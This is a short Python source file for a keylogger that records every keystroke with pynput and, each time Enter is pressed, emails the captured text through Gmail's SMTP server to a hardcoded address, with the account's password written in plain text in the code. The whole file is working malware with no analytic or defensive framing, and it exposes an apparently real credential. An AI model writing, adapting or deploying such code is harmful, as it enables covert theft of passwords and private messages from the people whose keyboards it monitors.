import smtplib
from pynput.keyboard import Listener

email = 'lisroeapp@gmail.com'
password = 'yvidahxvqzqwdbdo'

session = smtplib.SMTP('smtp.gmail.com', 587)
session.starttls()
session.login(email,password)

msg = ''

def keypress(key):
    global msg
    key=str(key)
    if key == "Key.f10":
        raise SystemExit(0)
    
    key=key.replace("'","")
    if key == "Key.space":
        msg += " "
    elif key == "Key.enter":
        session.sendmail(email, email, msg)
        print(msg)
        msg = ''
        
    else:
        msg += key     


        

app=Listener(on_press=keypress)

app.start()
app.join()


